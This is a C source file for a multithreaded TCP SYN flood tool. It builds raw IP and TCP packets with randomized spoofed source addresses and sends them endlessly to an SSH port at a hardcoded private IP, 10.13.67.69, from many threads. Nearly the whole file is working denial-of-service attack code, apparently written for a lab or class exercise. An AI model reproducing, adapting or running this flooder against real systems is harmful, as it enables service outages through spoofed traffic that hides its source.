#include "transfer.h"


void *thread_handler(void *arg){
    const char *server_ip = "10.13.67.69";
    uint16_t port = 22;

    int sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if(sd == -1){
        perror("socket error");
        exit(EXIT_FAILURE);
    }

    // packets
    IP_Header_t *iphead = (IP_Header_t *) malloc(sizeof(IP_Header_t));
    TCP_Header_t *tcphead = (TCP_Header_t *) malloc(sizeof(TCP_Header_t));

    // convert ip from string to binary
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = port;
    
    if(inet_pton(AF_INET, server_ip, &dest_addr.sin_addr) <= 0){
        perror("inet_pton error");
        exit(EXIT_FAILURE);
    }
    // Convert to host byte order
    uint32_t ip_value = ntohl(dest_addr.sin_addr.s_addr);
    
    size_t syn_len = sizeof(IP_Header_t) + sizeof(TCP_Header_t);

    fill_SYN(iphead, tcphead, ip_value, dest_addr.sin_port);

    // initialize rng
    srand(*((uint32_t*) arg));

    while(1){
        // get random number
        uint32_t randnum = rand();

        // randomize source address
        IP_set_src_address(iphead, get_random_src_address(randnum));

        // update checksums
        IP_update_checksum(iphead);
        TCP_update_checksum(tcphead, iphead);

        // serialize
        byte *ip_stream = serialize_ip_header(iphead);
        byte *tcp_stream = serialize_tcp_header(tcphead);
        //      combined serialized segments to form serialized packet
        byte *syn = form_packet(ip_stream, tcp_stream);

        // send packet
        if(sendto(sd, syn, syn_len, 0, (struct sockaddr *) &dest_addr, sizeof(struct sockaddr_in)) < 0){
            perror("sendto error");
            exit(EXIT_FAILURE);
        }else{
            printf("Sent successfully\n");
        }
        sleep(1);
    }

    close(sd);
    return NULL;
}

int main() {
    pthread_t ptid;
    srand(time(NULL));
    uint32_t randnum;

    for(int i = 0; i < IO_LIMIT; i++){
        randnum = rand();
        int pt = pthread_create(&ptid, NULL, thread_handler, (void *) &randnum);
        if(pt != 0){
            perror("pthread error");
        }
    }
    pthread_exit(NULL);
    return 0;
}
